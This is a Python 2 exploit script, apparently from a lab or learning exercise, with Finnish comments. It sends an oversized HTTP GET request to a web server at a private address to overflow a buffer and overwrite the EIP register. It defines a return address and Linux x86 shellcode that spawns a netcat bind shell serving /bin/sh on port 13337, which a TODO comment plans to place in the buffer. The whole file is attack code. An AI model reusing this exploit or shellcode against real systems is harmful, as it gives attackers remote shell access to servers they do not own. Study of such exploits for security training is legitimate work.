#!/usr/bin/python
# -*- coding: UTF-8 -*-

# Lähettää HTTP-pyynnön ja ylikirjoittaa palvelimen
# EIP-rekisterin
#

# TODO: Bufferiin shellcode ja EIP osoittamaan siihen

import socket

HOSTNAME = "10.211.55.9"
PORT = 8080
READBUF = 1024
payload = "\xEF\xBE\xAD\xDE"
eip_override = "\xa5\x94\x04\x08"
shellcode = "\x31\xc0\x50\x68\x33\x33\x33\x37\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65" \
            "\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80"
s = None
command2 = "GET / HTTP/1.1\r\nHost: "+ HOSTNAME + "\r\nConnection: Close\r\n\r\n"
command = "GET /" +  1008 * "A" + payload + " HTTP/1.1\r\nHost: "+ HOSTNAME + "\r\nConnection: Close\r\n\r\n"
req =   "GET / HTTP/1.0" + "A" * 2000 + "\r\n\r\n"
printdata = ""

for res in socket.getaddrinfo(HOSTNAME, PORT, socket.AF_INET, 
        socket.SOCK_STREAM):
        af, socktype, proto, canonname, sa = res
        try:
          s = socket.socket(af, socktype, proto)
        except socket.error:
          s = None
          continue
        try:
          s.connect(sa)
        except socket.error, msg:
          s.close()
          s = None
          continue
        
        if s:
          s.send(command)
          finished = False
          count = 0
          while not finished:
            data = s.recv(READBUF)
            count = count + 1
            if len(data) != 0:
              printdata = printdata + data
            else:
              finished = True
        s.shutdown(socket.SHUT_WR)
        s.close()
        break
          
print printdata
